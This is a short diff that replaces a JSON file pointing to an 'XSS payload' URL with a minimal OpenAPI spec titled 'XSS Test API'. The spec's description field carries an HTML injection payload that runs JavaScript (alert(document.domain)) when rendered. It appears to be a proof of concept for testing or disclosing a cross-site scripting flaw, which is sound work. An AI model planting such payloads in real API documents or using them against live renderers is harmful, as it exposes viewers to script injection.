@@ -1,9 +1,7 @@
-{
-    "url": "https://raw.githubusercontent.com/AlessandraZullo/SecurityBoard/refs/heads/main/poc/xss.yaml",
-    "urls": [
-        {
-            "url": "https://raw.githubusercontent.com/AlessandraZullo/SecurityBoard/refs/heads/main/poc/xss.yaml",
-            "name": "XSS payload"
-        }
-    ]
-}
+openapi: 3.1.0
+info:
+  title: XSS Test API
+  version: "1.0.0"
+  description: |
+    <img src=x onerror=alert(document.domain)>
+paths: {}
